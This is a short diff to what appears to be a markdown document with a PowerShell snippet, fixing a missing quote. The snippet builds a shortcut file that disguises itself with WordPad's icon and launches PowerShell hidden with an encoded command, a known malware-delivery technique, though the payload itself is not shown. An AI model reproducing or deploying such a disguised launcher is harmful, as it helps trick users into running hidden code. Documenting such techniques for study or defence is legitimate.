@@ -88,7 +88,7 @@ $link = $obj.createshortcut("c:\users\public\hit.lnk")
 $link.windowstyle = "7"
 $link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 $link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
-$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand $encodedCommand
+$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand $encodedCommand"
 $link.save()
 ```
 
